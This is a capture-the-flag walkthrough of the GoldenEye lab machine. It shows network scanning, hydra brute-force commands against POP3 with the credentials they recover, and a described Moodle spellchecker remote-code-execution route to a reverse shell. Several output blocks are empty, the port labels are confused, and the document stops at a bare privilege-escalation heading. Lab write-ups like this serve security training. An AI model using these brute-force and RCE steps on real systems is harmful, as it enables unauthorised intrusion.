# Write Up
## Enumeration
### Host Discovery 
Host Discovery is performed using [arpScan](https://github.com/aalmeidar/Tools). In this lab, machine ip is _10.0.2.30_.
```Shell
# arpScan.py -m 2 -r 10.0.2.0/24
[*] 52:54:00:12:35:00 10.0.2.1
[*] 52:54:00:12:35:00 10.0.2.2
[*] 08:00:27:ac:a4:24 10.0.2.3
[*] 08:00:27:d6:c7:04 10.0.2.30
```
### Port Scanning
Port Scanning is realized with [portScan](https://github.com/aalmeidar). Tool reported 4 open ports.
```Shell
# portScanner.py -i 10.0.2.30                      
[âˆ§] Scanning Ports: 65535
[*] Port 25 (smtp) open
[*] Port 80 (http) open
[*] Port 55007 (unknown) open
[*] Port 55006 (unknown) open
```

```
SMTP is running on port 25.
- Port 80:
```Console

```
Apache 2.4.7 is running on port 80.
- Port 55006:
```Console
nc -vn 10.0.2.30 55006

+OK GoldenEye POP3 Electronic-Mail System
```

Pop3 is running on port 55007.

### Web
In _Index_ there is a message and give us a login panel (_/sev-home/_). Let's see source code.
![Index](images/index.png)
![Source Code 1](images/sourcecode1.png)
![Source Code 2](images/sourcecode2.png)

There is a html escape encoded password. The password is: InvincibleHack3r. So, let's try user _boris_ (the message is for him) and password _InvincibleHack3r_. 
![Sev-Home](images/sev-home.png)

The login is successful. Also, in the source code there are two users:
![Source Code 3](images/sourcecode3.png)

## Exploitation

Now, let's bruteforce pop3 with source code users and password wordlist (_fasttrack.txt_). Let's use _hydra_.

```Console
hydra -L users.txt -P fasttrack.txt -s 55007 10.0.2.30 pop3
[DATA] max 16 tasks per 1 server, overall 16 tasks, 444 login tries (l:2/p:222), ~28 tries per task

[55007][pop3] host: 10.0.2.30   login: natalya   password: bird
1 of 1 target successfully completed, 2 valid passwords found
```
 Two users found. Natalya has an interesting mail.

```Console

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.
```
So let's add the domain to /etc/hosts and try login with xenia credentials.

![Xenia Moodle](images/xenia_moodle.png)

The web report that there is a message from Dr Doak, let's see it.

![Oak Message](images/oak_message.png)

Now, let's bruteforce again but with user doak.

```Console
# hydra -l doak -P fasttrack.txt -s 55007 10.0.2.30 pop3
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

And we have another credential. Login is successful in pop3 and there is a message with moodle password.

```Console

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

```
There is a private file in doak moodle:

![Doak Moodle](images/doak_moodle.png)

```Console
cat s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.%   
```

Let's access and extract metadata wit _exiftool_.

```

So, we have access to admin panel. To get a reverse shell, we are going to exploit spell checker , because is vulnerable to RCE.

To exploit it, you must put a one line command reverse shell, change the default spell engine to PSpellShell, go to post section and click on spellchecker box.

## Privilege escalation
